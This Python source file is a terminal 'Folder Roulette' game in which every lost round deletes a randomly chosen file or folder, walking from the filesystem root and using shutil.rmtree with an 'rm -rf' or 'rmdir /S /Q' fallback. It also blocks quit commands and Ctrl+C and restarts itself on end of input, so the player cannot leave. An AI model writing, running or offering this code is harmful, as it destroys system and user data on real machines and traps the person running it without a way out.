import os
import sys
import json
import random
import time
import shutil
import subprocess

SAVE_FILE = "save/game_state.json"

def clear_console():
    if os.name == 'nt':
        subprocess.call("cls", shell=True)
    else:
        subprocess.call("clear", shell=True)

def validate_input(user_input):
    forbidden_commands = ["stop", "quit", "exit"]
    if user_input.strip().lower() in forbidden_commands:
        print("\n[!] You cannot quit the game. Keep playing!")
        return False
    return True

def ensure_input(prompt):
    while True:
        try:
            user_input = input(prompt).strip()
        except KeyboardInterrupt:
            print("\n[!] You cannot quit with Ctrl + C. Please continue!")
            continue
        except EOFError:
            print("\n[!] Unexpected end of input. Restarting the game...")
            restart_game()

        if not validate_input(user_input):
            continue

        return user_input

def restart_game():
    print("[!] Restarting the game...")
    os.execl(sys.executable, sys.executable, *sys.argv)

def pick_random_path():
    root_path = "C:\\" if os.name == "nt" else "/"
    current_path = root_path

    steps = random.randint(1, 5)
    for _ in range(steps):
        try:
            entries = os.listdir(current_path)
            if not entries:
                break

            pick = random.choice(entries)
            path_chosen = os.path.join(current_path, pick)

            if os.path.isdir(path_chosen):
                if random.random() < 0.5:
                    current_path = path_chosen
                else:
                    return path_chosen
            else:
                return path_chosen

        except (PermissionError, FileNotFoundError):
            break

    return current_path

def force_delete_path(path):
    if not os.path.exists(path):
        print(f"[!] The path does not exist: {path}")
        return

    if os.path.isfile(path):
        print(f"[DELETING FILE] {path}")
        try:
            os.remove(path)
        except Exception as e:
            print(f"[ERROR] Could not remove file: {e}")
    else:
        print(f"[DELETING FOLDER] {path}")
        try:
            shutil.rmtree(path)
        except Exception as e:
            print(f"[ERROR] Could not delete folder: {e}")
            if os.name == "nt":
                os.system(f'rmdir /S /Q "{path}"')
            else:
                os.system(f'rm -rf "{path}"')

def delete_random_path():
    """
    Picks a random path (file or folder) and deletes it.
    """
    victim = pick_random_path()
    print(f"[!] Chosen path to delete: {victim}")
    force_delete_path(victim)

def save_state(mode_name, data):
    state = {
        "mode": mode_name,
        "data": data
    }
    os.makedirs(os.path.dirname(SAVE_FILE), exist_ok=True)
    with open(SAVE_FILE, "w") as f:
        json.dump(state, f)

def load_state():
    if not os.path.exists(SAVE_FILE):
        return None
    try:
        with open(SAVE_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def clear_state():
    if os.path.exists(SAVE_FILE):
        os.remove(SAVE_FILE)

def avoid_the_bullet(chrono):
    print("\n--- Mode: Avoid the Bullet ---\n")

    saved = load_state()
    if saved and saved.get("mode") == "avoid":
        data = saved["data"]
        round_number = data["round_number"]
        bullet_position = data["bullet_position"]
        chosen_numbers = set(data["chosen_numbers"])
        print(f"[!] Resuming from round {round_number}...")
    else:
        round_number = 1
        bullet_position = random.randint(1, 6)
        chosen_numbers = set()

    total_rounds = 6
    time_limit = 5

    while round_number <= total_rounds:
        print(f"\n[*] Round {round_number}/{total_rounds}")
        print("[!] If you lose this round, a random file/folder will be deleted.")

        save_state("avoid", {
            "round_number": round_number,
            "bullet_position": bullet_position,
            "chosen_numbers": list(chosen_numbers)
        })

        start_time = time.time()
        guess_str = ensure_input("[*] Choose a number between 1 and 6: ")
        try:
            guess = int(guess_str)
        except ValueError:
            print("[!] Invalid number.")
            continue

        # Timer check
        if chrono and (time.time() - start_time) > time_limit:
            print("[!] Time's up! You lost this round.")
            delete_random_path()
            round_number += 1
            continue

        if not 1 <= guess <= 6:
            print("[!] Number must be 1..6.")
            continue

        if guess in chosen_numbers:
            print("[!] Already chosen -> You lose this round.")
            delete_random_path()
        elif guess == bullet_position:
            print("[!] BOOM! You hit the bullet. Game Over!")
            delete_random_path()
            clear_state()
            return
        else:
            print("[+] Good job! You avoided the bullet.")

        chosen_numbers.add(guess)
        round_number += 1

    print("\n[+] You survived all rounds!")
    clear_state()

def find_the_bullet(chrono):
    print("\n--- Mode: Find the Bullet ---\n")

    saved = load_state()
    if saved and saved.get("mode") == "find":
        data = saved["data"]
        attempt = data["attempt"]
        bullet_position = data["bullet_position"]
        chosen_numbers = set(data["chosen_numbers"])
        print(f"[!] Resuming from attempt {attempt}...")
    else:
        attempt = 1
        bullet_position = random.randint(1, 6)
        chosen_numbers = set()

    total_attempts = 6
    time_limit = 5

    while attempt <= total_attempts:
        print(f"\n[*] Attempt {attempt}/{total_attempts}")
        print("[!] If you lose this attempt, a random file/folder will be deleted.")

        save_state("find", {
            "attempt": attempt,
            "bullet_position": bullet_position,
            "chosen_numbers": list(chosen_numbers)
        })

        start_time = time.time()
        guess_str = ensure_input("[*] Choose a number between 1 and 6: ")
        try:
            guess = int(guess_str)
        except ValueError:
            print("[!] Invalid number.")
            continue

        if chrono and (time.time() - start_time) > time_limit:
            print("[!] Time's up! You lost this attempt.")
            delete_random_path()
            attempt += 1
            continue

        if not 1 <= guess <= 6:
            print("[!] Must be 1..6.")
            continue

        if guess in chosen_numbers:
            print("[!] Already chosen -> You lose this attempt.")
            delete_random_path()
        elif guess == bullet_position:
            print("[!] Congratulations! You found the bullet!")
            clear_state()
            return
        else:
            print("[x] Missed! Try again.")

        chosen_numbers.add(guess)
        attempt += 1

    print("\n[!] You failed to find the bullet. Game Over!")
    clear_state()

def spinning_bullet(chrono):
    print("\n--- Mode: Spinning Bullet ---\n")

    saved = load_state()
    if saved and saved.get("mode") == "spinning":
        round_number = saved["data"]["round_number"]
        print(f"[!] Resuming from round {round_number}...")
    else:
        round_number = 1

    total_rounds = 6
    time_limit = 5

    while round_number <= total_rounds:
        bullet_position = random.randint(1, 6)

        print(f"\n[*] Round {round_number}/{total_rounds}")
        print("[!] If you lose this round, a random file/folder will be deleted.")

        save_state("spinning", {"round_number": round_number})

        start_time = time.time()
        guess_str = ensure_input("[*] Choose a number between 1 and 6: ")
        try:
            guess = int(guess_str)
        except ValueError:
            print("[!] Invalid number.")
            continue

        if chrono and (time.time() - start_time) > time_limit:
            print("[!] Time's up! You lost this round.")
            delete_random_path()
            round_number += 1
            continue

        if not 1 <= guess <= 6:
            print("[!] Must be 1..6.")
            continue

        if guess == bullet_position:
            print(f"[!] BOOM! The bullet was in {bullet_position}. You lose!")
            delete_random_path()
            clear_state()
            return
        else:
            print(f"[+] Safe! The bullet was in {bullet_position}.")

        round_number += 1

    print("\n[+] Congratulations! You survived all rounds!")
    clear_state()

def multi_chamber(chrono):
    print("\n--- Mode: Multi-Chamber ---\n")

    saved = load_state()
    if saved and saved.get("mode") == "multi":
        data = saved["data"]
        round_number = data["round_number"]
        bullet_positions = data["bullet_positions"]
        chosen_numbers = set(data["chosen_numbers"])
        bullet_count = len(bullet_positions)
        print(f"[!] Resuming from round {round_number} with {bullet_count} bullets.")
    else:
        bullet_count = random.randint(2, 5)
        bullet_positions = random.sample(range(1, 7), bullet_count)
        chosen_numbers = set()
        round_number = 1

    total_rounds = 6
    time_limit = 5

    print(f"[-] There are {bullet_count} bullets in the chambers!")

    while round_number <= total_rounds:
        print(f"\n[*] Round {round_number}/{total_rounds}")
        print("[!] If you lose this round, a random file/folder will be deleted.")

        save_state("multi", {
            "round_number": round_number,
            "bullet_positions": bullet_positions,
            "chosen_numbers": list(chosen_numbers)
        })

        start_time = time.time()
        guess_str = ensure_input("[*] Choose a number between 1 and 6: ")
        try:
            guess = int(guess_str)
        except ValueError:
            print("[!] Invalid number.")
            continue

        if chrono and (time.time() - start_time) > time_limit:
            print("[!] Time's up! You lost this round.")
            delete_random_path()
            round_number += 1
            continue

        if not 1 <= guess <= 6:
            print("[!] Must be 1..6.")
            continue

        if guess in chosen_numbers:
            print("[!] Already picked -> loss.")
            delete_random_path()
        elif guess in bullet_positions:
            print(f"[!] BOOM! Chamber {guess} had a bullet. You lose!")
            delete_random_path()
            clear_state()
            return
        else:
            print("[+] Good job! You avoided the bullets.")

        chosen_numbers.add(guess)
        round_number += 1

    print("\n[+] You survived all rounds!")
    clear_state()

def jackpot(chrono):
    print("\n--- Mode: Jackpot ---\n")

    saved = load_state()
    if saved and saved.get("mode") == "jackpot":
        data = saved["data"]
        bullet_position = data["bullet_position"]
        token_folders = data["token_folders"]
        print("[!] Resuming your Jackpot game...")
    else:
        bullet_position = random.randint(1, 6)
        token_folders = {}
        for token in range(1, 5):
            token_folders[token] = pick_random_path()

    total_tokens = 4
    time_limit = 10

    print(f"[-] You have {total_tokens} tokens, each associated with a random path.")
    for t, f in token_folders.items():
        print(f"    Token {t} => {f}")

    while True:
        print("\n[!] The bullet is hidden in one of the six chambers.")
        if chrono:
            print(f"[!] You have {time_limit} seconds to place your bets.")

        save_state("jackpot", {
            "bullet_position": bullet_position,
            "token_folders": token_folders
        })

        start_time = time.time()
        bet_input = ensure_input("[*] Place your bets (e.g. '1:4 2:4 3:5 4:6'): ")

        if chrono and (time.time() - start_time) > time_limit:
            print("[!] Time's up! You lost all your tokens.")
            for folder in token_folders.values():
                if folder:
                    force_delete_path(folder)
            clear_state()
            return

        all_bets = bet_input.split()
        bets = {}
        for single_bet in all_bets:
            if ":" not in single_bet:
                print(f"[x] Invalid format: {single_bet}. Use 'token:chamber'.")
                continue
            try:
                token, chamber = map(int, single_bet.split(":"))
            except ValueError:
                print(f"[x] Invalid format: {single_bet}. Use 'token:chamber'.")
                continue

            if token < 1 or token > total_tokens:
                print(f"[x] Invalid token {token}. Must be 1..{total_tokens}.")
                continue
            if chamber < 1 or chamber > 6:
                print(f"[x] Invalid chamber {chamber}. Must be 1..6.")
                continue

            bets[token] = chamber

        if len(bets) != total_tokens:
            print(f"[x] You must bet all {total_tokens} tokens.")
            continue

        print(f"\n[*] The bullet was in {bullet_position}.")
        saved_tokens = [t for t, c in bets.items() if c == bullet_position]
        lost_tokens = [t for t in bets if t not in saved_tokens]

        for t in lost_tokens:
            print(f"[!] Token {t} lost -> removing path {token_folders[t]}")
            if token_folders[t]:
                force_delete_path(token_folders[t])

        if saved_tokens:
            print("\n[*] You saved the following tokens:")
            for t in saved_tokens:
                print(f"    Token {t} => {token_folders[t]}")
        else:
            print("\n[x] All tokens lost. Better luck next time!")

        clear_state()
        print("\nGame over.")
        return

def infinite(chrono):
    print("\n--- Mode: Infinite ---\n")

    saved = load_state()
    if saved and saved.get("mode") == "infinite":
        round_number = saved["data"]["round_number"]
        print(f"[!] Resuming from round {round_number}...")
    else:
        round_number = 1

    time_limit = 5

    while True:
        bullet_position = random.randint(1, 6)
        print(f"\n[*] Round {round_number}")
        print("[!] If you lose this round, a random file/folder will be deleted.")

        save_state("infinite", {"round_number": round_number})

        start_time = time.time()
        guess_str = ensure_input("[*] Choose a number between 1 and 6: ")
        try:
            guess = int(guess_str)
        except ValueError:
            print("[x] Invalid input.")
            continue

        if chrono and (time.time() - start_time) > time_limit:
            print("[!] Time's up! You lost this round.")
            delete_random_path()
            round_number += 1
            continue

        if not 1 <= guess <= 6:
            print("[x] Must be 1..6.")
            continue

        if guess == bullet_position:
            print(f"[!] BOOM! The bullet was in {bullet_position}. Game Over!")
            delete_random_path()
            clear_state()
            break
        else:
            print(f"[+] Safe! The bullet was in {bullet_position}. You survived.")

        round_number += 1

    print("\n[!] Game over.")

def main():
    logo = """\033[31m
 ███████████          ████      █████                                         
░░███░░░░░░█         ░░███     ░░███                                          
 ░███   █ ░   ██████  ░███   ███████   ██████  ████████                       
 ░███████    ███░░███ ░███  ███░░███  ███░░███░░███░░███                      
 ░███░░░█   ░███ ░███ ░███ ░███ ░███ ░███████  ░███ ░░░                       
 ░███  ░    ░███ ░███ ░███ ░███ ░███ ░███░░░   ░███                           
 █████      ░░██████  █████░░████████░░██████  █████                          
░░░░░        ░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░                               

 ███████████                       ████            █████     █████            
░░███░░░░░███                     ░░███           ░░███     ░░███             
 ░███    ░███   ██████  █████ ████ ░███   ██████  ███████   ███████    ██████ 
 ░██████████   ███░░███░░███ ░███  ░███  ███░░███░░░███░   ░░░███░    ███░░███
 ░███░░░░░███ ░███ ░███ ░███ ░███  ░███ ░███████   ░███      ░███    ░███████ 
 ░███    ░███ ░███ ░███ ░███ ░███  ░███ ░███░░░    ░███ ███  ░███ ███░███░░░  
 █████   █████░░██████  ░░████████ █████░░██████   ░░█████   ░░█████ ░░██████ 
░░░░░   ░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░  ░░░░░░     ░░░░░     ░░░░░   ░░░░░░  \033[0m
"""
    username = os.getlogin()

    while True:
        print(logo)
        print("Hello", username)
        print("\nGames:\n")
        print("\033[91m1. Avoid the Bullet\033[0m")
        print("\033[91m2. Find the Bullet\033[0m")
        print("\033[91m3. Spinning Bullet\033[0m")
        print("\033[91m4. Multi-Chamber\033[0m")
        print("\033[91m5. Jackpot\033[0m")
        print("\033[91m6. Infinite\033[0m")
        print("\033[91m7. Return to Main Menu\033[0m\n")

        choice = ensure_input("[*] Select your game: ")
        if choice == "7":
            print("[*] Thank you for playing! Goodbye!")
            clear_console()
            break

        chrono_ask = ensure_input("[*] Do you want to enable the timer mode? (yes/no): ")
        chrono = (chrono_ask.lower() == "yes")

        if choice == "1":
            avoid_the_bullet(chrono)
        elif choice == "2":
            find_the_bullet(chrono)
        elif choice == "3":
            spinning_bullet(chrono)
        elif choice == "4":
            multi_chamber(chrono)
        elif choice == "5":
            jackpot(chrono)
        elif choice == "6":
            infinite(chrono)
        else:
            print("[!] Invalid choice. Please try again.")


if __name__ == "__main__":
    main()